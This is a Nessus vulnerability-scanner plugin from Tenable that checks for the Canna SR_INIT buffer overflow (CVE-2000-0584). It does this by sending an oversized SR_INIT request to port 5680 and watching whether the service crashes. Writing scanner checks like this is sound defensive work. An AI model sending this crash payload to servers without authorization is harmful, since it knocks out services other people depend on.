#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(11114);
 script_bugtraq_id(1445);
 script_osvdb_id(1452);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2000-0584");
 script_name(english:"Canna SR_INIT Command Remote Overflow");
 script_summary(english:"Checks if the remote Canna can be buffer overflown");

 script_set_attribute(attribute:"synopsis", value:
"The remote language translation service has a buffer overflow
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Canna, a service that processes Japanese
input and translates it from kana to kanji.

It was possible to make the remote Canna server crash by sending a
SR_INIT command with a very long string.  A remote attacker could use
this to crash the service, or possibly execute arbitrary code." );
 # https://web.archive.org/web/20000819124158/http://archives.neohapsis.com/archives/vendor/2000-q2/0062.html
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.nessus.org/u?5a347380"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of the software."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/08/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/07/05");
 script_cvs_date("$Date: 2016/11/15 13:39:08 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
		    
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"Gain a shell remotely");
 
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
		  
 script_require_ports(5680);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

port = 5680;
if(!get_port_state(port))exit(0, "TCP port "+port+" is closed.");
soc = open_sock_tcp(port);
if(! soc) exit(1, "Cannot open TCP connection to port "+port+".");

  req = raw_string(0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 50) + 
        "3.3:" + crap(300) + raw_string(0);
  send(socket:soc, data:req);
  r = recv(socket:soc, length:4);
  close(soc);

if (service_is_dead(port: port, exit: 1) > 0)
  security_hole(port);
